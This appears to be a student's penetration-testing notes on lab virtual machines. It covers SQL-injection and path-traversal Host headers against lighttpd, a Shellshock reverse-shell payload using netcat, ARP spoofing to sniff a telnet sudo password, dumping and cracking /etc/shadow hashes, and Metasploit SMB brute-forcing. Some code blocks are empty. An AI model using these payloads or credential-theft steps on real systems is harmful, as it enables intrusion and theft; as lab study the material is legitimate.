Thought I'd summarize some data about each host here. Feel free to update this document!


# ~~Ubuntu 10.04.3~~

* Linux 2.6.17 - 2.6.36
* 2 running daemons found (lighttpd most interesting?)
* 1 High rated vulnerability

## Services & Ports

| Port | Protocol | Service 		|
|:----:|:--------:|-------------|
|23		 | tcp			|	telnetd 		|
|80		 | tcp			| lighttpd 1.4.26 |

## Ideas
The vulnerability for lighttpd suggests that there may be path traversal or SQLinjection, but ***only*** if `mod_mysql_vhost` and/or `mod_evhost`/`mod_simple_vhost` are enabled.

Supposedly, they work like this:

1. SQLi:
    * When lighttpd requests a vhost with `mod_mysql_vhost` enabled, it requests it as ```sql "SELECT docroot FROM domains WHERE '?' like domain;``` where the question-mark is not escaped. The query may look different, but this is what I've been able to find. The PoC injection is as follows: `' UNION SELECT '/`. If called with /etc/passwd as the domain, it would normally return no rows. With a union, it would return rows and the query should succeed.
    * I have not been able to make this work, instead I get a 404 Not Found, suggesting `mod_mysql_vhost` is not enabled.
2. Path traversal 
    * When lighttpd checks for a document root, it inserts the host into `/var/www/[host]`. If the `Host: ` header is an IPv6 address followed by double-dot sequences, like `Host: [::1]/../../etc/passwd` it would become like this: `/var/www/[::1]/../../etc/passwd`, leading to path traversal.
    * I have not been able to make this work either, but have been able to verify the code has not been patched. This ***should*** work, I must be doing something wrong.

#### SQLi approach:

I sent the following Proof of Concept query using wget:

`wget -O- -d --header="Host: [::1]' UNION SELECT '/" 192.168.248.129/etc/passwd`

```
---request begin---
GET /etc/passwd HTTP/1.1
User-Agent: Wget/1.13.4 (linux-gnu)
Accept: */*
Host: [::1]' UNION SELECT '/
Connection: Keep-Alive

---request end---

---response begin---
HTTP/1.1 404 Not Found
Content-Type: text/html
Content-Length: 345
Date: Mon, 27 Oct 2014 12:44:24 GMT
Server: lighttpd/1.4.26

---response end--- 
```

#### Path Traversal approach:

I sent the following headers to the site, without results:

```
---request begin---
GET / HTTP/1.1
User-Agent: Wget/1.13.4 (linux-gnu)
Accept: */*
Host: [::1]/../../../../../../etc/passwd
Connection: Keep-Alive

---request end---
HTTP request sent, awaiting response... 
---response begin---
HTTP/1.1 200 OK
Vary: Accept-Encoding
Content-Type: text/html
Accept-Ranges: bytes
ETag: "1568625240"
Last-Modified: Fri, 03 Oct 2014 18:32:52 GMT
Content-Length: 1275
Date: Tue, 28 Oct 2014 01:15:15 GMT
Server: lighttpd/1.4.26

---response end---
```

This leads to no change, however, increasing the colons in [::1] to more than 7 will cause Internal Server Error. This is documented [here](http://redmine.lighttpd.net/projects/lighttpd/repository/revisions/2959/diff/) on line 47 in requests.c

#### Shellshock
I believe these VMs were created before shellshock was discovered / patched, or it may have slipped the authors mind. I **think** I managed to get a remote code execution running using `wget` with the header ` User-Agent: () { :; }; /bin/bash -c "nc 192.168.248.132 6666 -e /bin/bash -i"` although this should not be possible, unless the default index page which we still do not know the name of is a `cgi-bin` script, and it might be. 

The VM suddenly started pinging me relentlessly and has been doing so for hours, but I cannot seem to get a reverse TCP shell with netcat going.


#### ARP Spoof & TELNET hijack approach

Using Wireshark I saw there was a TELNET connection going to an IP that did not exist on the network. I decided to ARPSPOOF and pretend I was this IP, and then listen for TELNET connection: And I got a connection!

First, I stole the IPs with arp poisoning as such:

![ARPspoof #2](arpspoof2.png)

Then, I listened for TELNET connections, and got this:

![TELNET Sniffing with dsniff](telnet.png)

I continued with logging into telnet, realizing John is stupid as fuck and sends his sudo password in cleartext, I could easily change the root password to `pwnd` and vo√≠la! Rooted, bitch!

![PWND](pwnd.png)


#### Looting

Having compromised this box, I thought I'd check what interesting things we can get from it. Perhaps, if we're lucky, there's something useful here. I decided to steal the `/etc/shadow` file with passwords for further investigation, and got 3 interesting ones:

```
root:$6$x9LyUphj$3cQTGIb269GBNuKc6GER29W9Ht7NmHjMRlyeR35oTTqngQHVD4gupwzSmjhAYOc6KEyfGQ32De27SgOCNzKcE.:16371:0:99999:7:::

...

telnetd:*:16346:0:99999:7:::
john:$6$4xE5VNT4$Vb0nrZ64DGZvWmEy9sUKkCaS9O5lb50WlzSIxim6ydaCVfzWJrmLuwZIPxjgw1ZDIeQB9C9jX7qb7AtiDibjo0:16346:0:99999:7:::
user:$6$Jp01V0lm$RX7eMjNIIoCnazLNEtSAe5Uq.nQINXMOpEggvRtTEV63QEMUEpmwFMJhYzQtLT/M33Kbl5Mhr59tPJbvN/u4k1:16346:0:99999:7:::
```
Removed the uninteresting stuff for brevity. Well, here we got some interesting stuff -- we have `user`, `john` and `jane`. First of all, we already know John's password. So what about Jane and User then?

At first glance these look like regular unix SHA512 hashes -- at least John and User. But Jane's is different. 

Let's verify that. After saving Jane's password to `jane.wtf`, I ran *hashid* to get more information:

```
[root@battlestation cudaHashcat-1.31]# hashid -f jane.wtf
Analyzing '/home/amnesthesia/cudaHashcat-1.31/jane.hash'
Hashes analyzed: 1
Hashes found: 1
Output written: '/home/amnesthesia/cudaHashcat-1.31/hashid_output.txt'

Analyzing '$1$a0rCbP9/$1FKr5sobP4rQHxuTA/l/p.'
[+] MD5 Crypt
[+] Cisco-IOS(MD5)
[+] FreeBSD MD5

``` 

Looks like Jane is an MD5 Crypt hash, so let's just check User's to be sure then.

```
[root@battlestation cudaHashcat-1.31]# hashid -f user.wtf
Analyzing '/home/amnesthesia/Downloads/cudaHashcat/cudaHashcat-1.31/user.wtf'
Hashes analyzed: 1
Hashes found: 1
Output written: '/home/amnesthesia/Downloads/cudaHashcat/cudaHashcat-1.31/hashid_output.txt'

[+] SHA-512 Crypt

```

Alright, so we have one MD5Crypt and one SHA512. Looks like we're gonna have to crack these passwords, and since I have an nVidia card I use cuda, and thus cudaHashcat.

##### Cracking Jane
After firing up cudaHashcat, and setting the attack mode to Straight with the 500 id representing an MD5Crypto hash, I pointed it to use the `rockyou.txt` wordlist because why not -- we might be lucky!
```

```

There we have them.

Password for User is **summer**

Password for Jane is **pissoff**

Very fitting, as October means summer is pissing off ;)

Well, time to check the Windows box!

# Windows Vista Business (build 6000)

* Windows Vista Business (build 6000)
* nmap guesses Windows 7 SP0-SP1 / Server 2008 / Win8
* 4-9 running services found (SMB most interesting?)
* 1 High rated vulnerability

## Services & Ports

| Port | Protocol | Service 		|

## Ideas

The only vulnerability with a **High** rating is the SMB one. We don't want Denial of Service, but we want the RCE one. I got quite far with it, and managed to collect nonce's from Windows by following the [PoC](http://www.hexale.org/advisories/OCHOA-2010-0209.txt). Using these Ruby scripts (**Note:** Replace : with `do` after the `while` statements to run them), I got stuck at the point where I had to get the user to visit a HTML page to actually "sign" these nonces for us. Had the user been logged in and performed any web requests, perhaps *ARP poisoning* or *DNS poisoning* had been possible to achieve this, but as no user is logged in, this was a dead end.

Even though it's Vista, I think this machine may be a decoy and not vulnerable without user interaction. Several exploits seem to exist for Vista SP1, ironically, and I have tried them all. This Vista is not patched it seems, and the exploits available require user interaction.


### Following up on the SMB trail

Alright, first of all ... Let's see what info we can get about this system.

```

```

Well, damn. This much we already knew ... 

Using `nbtscan`, I tried to see what was on the Windows SMB

```

```

I also, rather blindly, attempted to use an otherwise rather good RCE in `smb_relay` using Metasploit, and proceeded with:

```

Seems I got nothing ... Hmm ... Maybe I just misinterpreted the output of `nbtscan`? It's probably not share names but group/domain names. I'll try to smb_enumshares and see what we can get?

### Using the loot from Ubuntu

Well, now that we have some information from the compromised machine, we can use that to continue checking this Windows box.

First of all, let's see if we can log in. Let's try with `User` and the password `summer` we cracked!

Look at that! We got loggedin! :D Let's continue checking what other users exist on this system, maybe Jane is here?

#### Enumerating users

Using `smb_enumusers` and our log in, lets see what we find.

```
msf auxiliary(psexec_loggedin_users) > use auxiliary/scanner/smb/smb_enumusers
msf auxiliary(smb_enumusers) > show options

Module options (auxiliary/scanner/smb/smb_enumusers):

Looks like Jane isn't here. But `Admin`, `Administrator`, `Guest` and our `User` is. Hmm, well, `Administrator` exists by default in Windows, but as far as I know, `Admin` does not. Maybe NOW we can get some shares, since we can log in! Lets see what shares are available here, let's use `smb_enumshares` and see what we find.

```

Okay! So we know we have `ADMIN$`, `C$`and `IPC$`.

After attempting to log in to `SAMBA` multiple times, it seems we have no read/write access to any of these shares. Damn. Dead-end? We need higher privileges. Alright so, lets try a dictionary attack against the users we found as well then.

First, we make a list of the users and save it as `userlist`
```
root@battlestation:~# printf "Admin\nAdministrator\nGuest" > userlist
```

This will be the list of all users we'll try. Now, we'll use the same wordlist again and set that as our `PASS_FILE` and this user list as our `USER_FILE` for the `smb_login` auxiliary scanner module in metasploit. Hopefully, if we're lucky, we can find the right password for any of these users:

## Gaining Access
We have logged in as John on the Ubuntu box. We found User to work on the Windows box. And we have a third user, whose password we have also cracked: `jane`. 

The nmap scan, the results presented above, shows that OpenSSH is running on the default SSH port, so let's see if we can get in as the third user.

```
root@battlestation:~# ssh jane@192.168.248.130
jane@192.168.248.130's password: 
Last login: Wed Oct 29 18:13:59 2014
Hi - congratulations on the login!
Well played!

Can you evolve and get more useful access here?

 - L

$
```

Well, look at that -- surely we could! Well, what now then? That is one *damn* provocative MotD, so I sure hope we can get in here.

## Going on BSD Safari
Now that we're in, we should have a look around. As Les Stroud in Survivorman said, when you set up camp in unknown territory (this BSD box), it's always a good plan to make a map for yourself. Scout the area, mark the landmarks -- maybe it won't be exact, but it'll guide you in the future. Let's listen to Survivorman and do exactly that!

First of all -- **where am I?!**

```
$ uname -a
OpenBSD m2.localdomain 4.8 GENERIC#136 i386
```

### Who lives here?
Let's check who else is on this box! 

```
$ cat /etc/passwd                                                              
root:*:0:0:Charlie &:/root:/bin/ksh
...
john:*:1000:10:John:/home/john:/bin/ksh
jane:*:1001:1001:Jane:/home/jane:/bin/ksh
tarzan:*:1002:1002:John Clayton III:/home/tarzan:/bin/ksh
$
```

Alright, that's interesting. John is on here too? And Tarzan, Jane's Romeo?

```
$ cat /etc/group                                                               
wheel:*:0:root,john
...
kmem:*:2:root
sys:*:3:root
tty:*:4:root
operator:*:5:root
...
staff:*:20:root
...
sshd:*:27:
...
guest:*:31:root
...
jane:*:1001:
tarzan:*:1002:
$ 

```

Okay, so we have mainly one interesting group here: `wheel`. The sudoers group. It seems that once again, John is privileged - while tarzan and jane are not.

Let's check out Tarzan's `/home/`, and why not John's as well? After all, John is the boss here.

```
$ ls -la /home/tarzan
total 32
drwxr-xr-x  3 tarzan  tarzan  512 Oct  3 21:54 .

$ ls -la /home/john
total 32
drwxr-xr-x  3 john  users  512 Oct  3 21:02 .
drwxr-xr-x  5 root  wheel  512 Oct  3 21:54 ..

-rw-r--r--  1 john  users  113 Aug 16  2010 .mailrc
-rw-r--r--  1 john  users  218 Aug 16  2010 .profile
drwx------  2 john  users  512 Oct  3 21:04 .ssh
$

```

Hmm, well, okay -- looks like tarzan is *actually* called `John Clayton III`. So ... maybe John is *Tarzan*? I have 3 ideas: 

* Maybe tarzan has John's password?
* Maybe john has the same password as on Ubuntu?
* Maybe tarzan has the *other* thing printed in Ubuntu's TCP distress signal?

Recall:

```
root@battlestation:~# dsniff -t 23/tcp=telnet
dsniff: listening on eth0
-------------
10/28/14 03:31:48 tcp 172.16.57.129.27008 -> 172.16.57.130.23 (telnet)
john
meTarzanSuperUser
sudo su +
meTarzanSuperUser
AiAiAi....
```

Unfortunately, both `sudo su +` and `AiAiAi....` were followed by strange (possibly unicode) characters we couldn't really see in our terminal.

But, let's try these logins!

#### Tarzan! It's Jane! Let me in!

```
$ login tarzan
Password: [meTarzanSuperUser]
Login incorrect
$ Login tarzan
Password: [AiAiAi....]
Login incorrect
```

Well then ... What about John?

#### JOHN!

```
$ login john
Password: [meTarzanSuperUser
Login incorrect
$ login john
Password: [AiAiAi....]
Login incorrect
```

Damnit :(

### Where am I allowed?

So let's find out where we can read and write, this may be useful information, right? Time to scan for group or world writeable directories and see what we get.

```


### Can I hitch a ride?
Well, alright ... Now we know where we can go, but is there perhaps a way for us to expand our cybernetic consciousness here? Perhaps ... we can find a path to the enlightened one, the Bodhisattva of this system, the second to root: `john`. Or, can we become that person?

Let's check what files have the `setuid` bit set, and are owned by root. Perhaps if we're lucky, we can hitch a ride and perform some sort of action through one of those files if we're lucky?

```

-r-sr-x---  1 root  operator  -  194K Aug 16  2010 /sbin/shutdown
```

I also performed a scan for what files we can read, but the list is very exhaustive ... After using this command: `find / -type d \( -perm -o=r \) -exec ls -ldoha {} \;` the most interesting things were some files in the `/var/log` directory; the `/etc/` configuration directory (including SSH! The possibly vulnerable service we found which we can read the configuration for!)

## What can we actually do here?
Yeah ... Then there's that... SSH is in default configuration and not vulnerable to the OpenSSH wildcard exploit it seems :( And here we are ...

|**Summary:**|
|The auth_parse_options function in auth-options.c in sshd in OpenSSH before 5.7<br>provides debug messages containing authorized_keys command options, which allows<br>remote authenticated users to obtain potentially sensitive information by<br>reading these messages, as demonstrated by the shared user account required by Gitolite.<br>**NOTE:** this can cross privilege boundaries because a user account may<br>intentionally have no shell or filesystem access, and therefore may have no<br>supported way to read an authorized_keys file in its own home directory.<br>OpenSSH before 5.7 is affected;|
|**Solution:**|
|Updates are available. Please see the references for more information.|
